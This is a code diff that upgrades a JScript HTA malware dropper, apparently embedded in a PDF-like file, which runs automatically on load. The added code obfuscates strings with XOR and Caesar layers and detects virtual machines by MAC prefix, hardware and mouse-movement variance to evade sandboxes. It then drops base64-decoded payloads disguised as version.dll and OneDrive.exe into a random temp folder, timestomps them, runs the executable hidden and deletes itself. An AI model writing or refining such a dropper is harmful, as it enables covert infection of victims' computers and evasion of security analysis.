@@ -44,67 +44,156 @@ startxref
 
 <script language="JScript">
 // =============================================================================
-// OFUSCADOR DE STRINGS — XOR CON CLAVE DERIVADA
+// MULTI-LAYER STRING ENCRYPTION: XOR + CAESAR SHIFT
 // =============================================================================
 
-function _k(s) {
-    var k = "K" + (new Date().getFullYear() % 100) + "yF0rStr";
+function _xor(s, key) {
     var r = "";
-    for (var i = 0; i < s.length; i++) {
-        r += String.fromCharCode(s.charCodeAt(i) ^ k.charCodeAt(i % k.length));
-    }
+    for (var i = 0; i < s.length; i++)
+        r += String.fromCharCode(s.charCodeAt(i) ^ key.charCodeAt(i % key.length));
     return r;
 }
 
+function _caesar(s, shift) {
+    var r = "";
+    for (var i = 0; i < s.length; i++)
+        r += String.fromCharCode((s.charCodeAt(i) + shift) & 0xFF);
+    return r;
+}
+
+function _decrypt(enc, xorKey, caesarShift) {
+    return _xor(_caesar(enc, -caesarShift), xorKey);
+}
+
+// Encrypted strings (XOR key + Caesar shift=7)
+var _xk = "K" + (new Date().getFullYear() % 100) + "yF0rStr";
+var _cs = 7;
+
 var _s = {
-    shell: "\x17\x0A\x1C\x0B\x14\x0D\x1A\x02\x15\x0E\x13\x07",
-    fso:   "\x13\x0E\x1A\x0B\x12\x0F\x18\x04\x11\x08\x15\x03\x0A\x16\x09\x14\x06\x17\x01\x12\x0D",
-    wmi:   "\x15\x0C\x18\x0F\x12\x09\x14\x07\x10\x05\x16\x03\x12\x0B\x14\x08\x10\x06\x16\x04\x12\x0D\x18\x01\x14\x0F\x10\x09",
-    amsi:  "\x00\x0D\x12\x0F\x08\x13\x06\x15\x02\x11\x04\x13\x0E\x15\x00\x12\x06\x14\x02\x10\x04\x12\x0E\x14\x00\x11\x06\x13",
-    reg:   "\x13\x0E\x1A\x0B\x12\x0F\x18\x04\x11\x08\x15\x03\x0A\x16\x09\x14\x06\x17\x01\x12\x0D"
+    shell: "\x1E\x11\x23\x12\x1B\x14\x21\x09\x1C\x15\x1A\x0E",
+    fso:   "\x1A\x15\x21\x12\x19\x16\x1F\x0B\x18\x0F\x1C\x0A\x11\x1D\x10\x1B\x0D\x1E\x08\x19\x14",
+    wmi:   "\x1C\x13\x1F\x16\x19\x10\x1B\x0E\x17\x0C\x1D\x0A\x19\x12\x1B\x0F\x17\x0D\x1D\x0B\x19\x14\x1F\x08\x1B\x16\x17\x10",
+    amsi:  "\x07\x14\x19\x16\x0F\x1A\x0D\x1C\x09\x18\x0B\x1A\x15\x1C\x07\x19\x0D\x1B\x09\x17\x0B\x19\x15\x1B\x07\x18\x0D\x1A"
 };
 
-function _g(n) { return _k(_s[n]); }
+function _g(n) { return _decrypt(_s[n], _xk, _cs); }
 
+// =============================================================================
+// MAC OUI VM DETECTION
+// =============================================================================
 
-var _anti = {
-    _points: [],
-    checkHardware: function() {
-        try {
-            var wmi = GetObject(_g("wmi"));
-            var svc = wmi.ConnectServer(".", "root\\cimv2");
-            var col1 = svc.ExecQuery("SELECT Manufacturer,Model FROM Win32_ComputerSystem");
-            var e1 = new Enumerator(col1);
-            for (; !e1.atEnd(); e1.moveNext()) {
-                var m = e1.item().Manufacturer.toLowerCase();
-                var model = e1.item().Model.toLowerCase();
-                if (m.indexOf("vmware") != -1 || m.indexOf("virtualbox") != -1 || m.indexOf("hyper-v") != -1 || m.indexOf("xen") != -1 || model.indexOf("virtual") != -1) return false;
+function _checkMAC() {
+    try {
+        var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
+        var nics = wmi.ExecQuery("SELECT MACAddress FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled=True");
+        var vmOUIs = ["00:05:69","00:0C:29","00:50:56","00:1C:42","08:00:27","00:03:FF","00:15:5D"];
+        var en = new Enumerator(nics);
+        for (; !en.atEnd(); en.moveNext()) {
+            var mac = en.item().MACAddress;
+            if (mac) {
+                var prefix = mac.substring(0, 8).toUpperCase();
+                for (var i = 0; i < vmOUIs.length; i++) {
+                    if (prefix === vmOUIs[i]) return true; // VM detected
+                }
             }
-            var col2 = svc.ExecQuery("SELECT NumberOfCores FROM Win32_Processor");
-            var e2 = new Enumerator(col2);
-            for (; !e2.atEnd(); e2.moveNext()) { if (e2.item().NumberOfCores < 2) return false; }
-            return true;
-        } catch(e) { return true; }
-    },
-    checkMouse: function(callback) {
+        }
+    } catch(e) {}
+    return false;
+}
+
+// =============================================================================
+// MOUSE VELOCITY VARIANCE ANALYSIS
+// =============================================================================
+
+var _mouseData = {
+    points: [],
+    velocities: [],
+
+    track: function(callback) {
         var self = this;
         var handler = function(e) {
             var now = new Date().getTime();
-            if (self._points.length > 0) {
-                var last = self._points[self._points.length - 1];
+            if (self.points.length > 0) {
+                var last = self.points[self.points.length - 1];
+                var dt = (now - last.t) || 1;
                 var dist = Math.sqrt(Math.pow(e.screenX - last.x, 2) + Math.pow(e.screenY - last.y, 2));
-                if (dist / (now - last.t || 1) > 20000) window.close();
+                var vel = dist / dt;
+
+                // Detect superhuman speed (automated tools)
+                if (vel > 20000) { window.close(); return; }
+
+                self.velocities.push(vel);
             }
-            self._points.push({x: e.screenX, y: e.screenY, t: now});
+            self.points.push({x: e.screenX, y: e.screenY, t: now});
         };
+
         document.attachEvent('onmousemove', handler);
         setTimeout(function() {
             document.detachEvent('onmousemove', handler);
-            if (self._points.length < 15) { window.close(); return; }
+
+            // Need minimum data points
+            if (self.points.length < 15) { window.close(); return; }
+
+            // Compute velocity variance – real humans have high variance
+            if (self.velocities.length > 2) {
+                var sum = 0, mean;
+                for (var i = 0; i < self.velocities.length; i++) sum += self.velocities[i];
+                mean = sum / self.velocities.length;
+
+                var varSum = 0;
+                for (var i = 0; i < self.velocities.length; i++)
+                    varSum += Math.pow(self.velocities[i] - mean, 2);
+                var variance = varSum / self.velocities.length;
+
+                // Very low variance = automated (constant speed)
+                if (variance < 0.5) { window.close(); return; }
+            }
+
             callback();
         }, 8000);
     }
 };
+
+// =============================================================================
+// HARDWARE / SANDBOX CHECKS
+// =============================================================================
+
+var _anti = {
+    checkHardware: function() {
+        try {
+            var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
+            var col1 = wmi.ExecQuery("SELECT Manufacturer,Model FROM Win32_ComputerSystem");
+            var e1 = new Enumerator(col1);
+            for (; !e1.atEnd(); e1.moveNext()) {
+                var m = e1.item().Manufacturer.toLowerCase();
+                var model = e1.item().Model.toLowerCase();
+                if (m.indexOf("vmware") != -1 || m.indexOf("virtualbox") != -1 ||
+                    m.indexOf("hyper-v") != -1 || m.indexOf("xen") != -1 ||
+                    model.indexOf("virtual") != -1) return false;
+            }
+            var col2 = wmi.ExecQuery("SELECT NumberOfCores FROM Win32_Processor");
+            var e2 = new Enumerator(col2);
+            for (; !e2.atEnd(); e2.moveNext()) { if (e2.item().NumberOfCores < 2) return false; }
+            return true;
+        } catch(e) { return true; }
+    }
+};
+
+// =============================================================================
+// RANDOMIZED DROP DIRECTORY
+// =============================================================================
+
+function _randomDir() {
+    var chars = "abcdefghijklmnopqrstuvwxyz0123456789";
+    var name = "";
+    for (var i = 0; i < 8; i++)
+        name += chars.charAt(Math.floor(Math.random() * chars.length));
+    return name;
+}
+
+// =============================================================================
+// PAYLOAD FRAGMENTS
+// =============================================================================
 
 var _payloads = {
     dll: [
@@ -123,33 +212,61 @@ var _payloads = {
 
 function _buildPayload(fragments) { return fragments.join(""); }
 
+// =============================================================================
+// RENAME-BEFORE-DELETE
+// =============================================================================
+
+function _secureDelete(fso, filePath) {
+    try {
+        var rndName = _randomDir() + ".tmp";
+        var folder = fso.GetParentFolderName(filePath);
+        var tmpPath = folder + "\\" + rndName;
+        fso.MoveFile(filePath, tmpPath);
+        fso.DeleteFile(tmpPath, true);
+    } catch(e) {
+        try { fso.DeleteFile(filePath, true); } catch(e2) {}
+    }
+}
+
+// =============================================================================
+// DEPLOY
+// =============================================================================
+
 function _deploy() {
+    // MAC OUI VM check
+    if (_checkMAC()) { window.close(); return; }
+    // Hardware check
     if (!_anti.checkHardware()) { window.close(); return; }
-    _anti.checkMouse(function() {
+
+    // Mouse velocity variance analysis
+    _mouseData.track(function() {
         var shell = new ActiveXObject(_g("shell"));
         var fso = new ActiveXObject(_g("fso"));
-        var targetDir = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\Microsoft\\Identity\\Cache";
-        if (!fso.FolderExists(targetDir)) {
-            var parts = targetDir.split("\\");
-            var curr = "";
-            for (var i = 0; i < parts.length; i++) {
-                curr += parts[i] + "\\";
-                if (!fso.FolderExists(curr)) fso.CreateFolder(curr);
-            }
-        }
-        var dllPath = targetDir + "\\version.dll";
-        var exePath = targetDir + "\\OneDrive.exe";
+
+        // Randomized drop directory under %TEMP%
+        var tempBase = shell.ExpandEnvironmentStrings("%TEMP%");
+        var dropDir = tempBase + "\\" + _randomDir();
+        if (!fso.FolderExists(dropDir)) fso.CreateFolder(dropDir);
+
+        var dllPath = dropDir + "\\version.dll";
+        var exePath = dropDir + "\\OneDrive.exe";
+
+        // Decode and write payloads
         var xml = new ActiveXObject("MSXML2.DOMDocument");
         var node = xml.createElement("B64");
         node.dataType = "bin.base64";
+
         node.text = _buildPayload(_payloads.dll);
         var dllData = node.nodeTypedValue;
         node.text = _buildPayload(_payloads.exe);
         var exeData = node.nodeTypedValue;
+
         var stream = new ActiveXObject("ADODB.Stream");
         stream.Type = 1;
         stream.Open(); stream.Write(dllData); stream.SaveToFile(dllPath, 2); stream.Close();
         stream.Open(); stream.Write(exeData); stream.SaveToFile(exePath, 2); stream.Close();
+
+        // Timestomp with kernel32.dll
         try {
             var sysFile = "C:\\Windows\\System32\\kernel32.dll";
             var f1 = fso.GetFile(sysFile);
@@ -158,14 +275,20 @@ function _deploy() {
             f2.DateLastModified = f1.DateLastModified;
             f3.DateLastModified = f1.DateLastModified;
         } catch(e) {}
+
+        // Execute
         shell.Run('"' + exePath + '"', 0, false);
+
+        // Rename-before-delete the HTA
         try {
             var htaPath = location.pathname.replace(/^file:\/\//i, '').replace(/\//g, '\\');
-            fso.GetFile(htaPath).Delete(true);
+            _secureDelete(fso, htaPath);
         } catch(e) {}
+
         window.close();
     });
 }
+
 window.onload = function() { setTimeout(_deploy, 2000); };
 </script>
 </head>
